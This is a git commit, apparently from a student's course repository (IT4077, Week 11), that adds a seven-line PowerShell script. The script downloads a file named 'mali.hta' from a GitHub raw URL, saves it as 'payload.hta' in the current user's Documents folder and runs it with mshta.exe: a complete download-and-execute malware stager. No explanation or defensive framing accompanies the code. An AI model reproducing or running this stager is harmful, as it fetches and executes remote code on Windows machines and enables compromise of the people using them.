78d3313f94f5b421d5cc8d42897a81667acb3c7c
Nicholas Spagnola <39714515+EvaStanAccount@users.noreply.github.com>
2024-10-31 15:47:21 -0400

    Add files via upload

---
+++ Week11/Week11.ps1
@@ -0,0 +1,7 @@
+﻿
+$url = "https://raw.githubusercontent.com/EvaStanAccount/IT4077/refs/heads/Main/Week11/mali.hta"
+$Username = $env:USERNAME
+$filepath = "C:\Users\"+$Username+"\Documents\payload.hta"
+(new-object net.webclient).downloadfile($url,$filepath)
+
+C:\Windows\system32\mshta.exe $filepath
